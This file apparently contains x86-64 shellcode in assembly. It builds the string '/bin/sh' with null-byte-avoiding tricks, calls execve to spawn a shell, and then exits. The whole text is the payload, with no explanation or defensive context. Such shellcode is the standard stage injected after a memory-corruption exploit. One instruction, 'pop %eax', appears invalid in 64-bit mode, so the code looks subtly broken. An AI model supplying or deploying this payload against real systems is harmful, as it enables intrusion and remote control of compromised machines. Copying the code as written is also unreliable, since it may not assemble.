.section .text
.globl _start
_start:
    push $0x3b
    pop %eax
    xor %rdx,%rdx
    movabs $0x68732f6e69622f2f,%r8    
    shr $0x8, %r8                    
    push %r8
    mov %rsp, %rdi
    push %rdx
    push %rdi
    mov %rsp, %rsi
    syscall
    push $0x3c
    pop %eax
    xor %rdi,%rdi
    syscall     
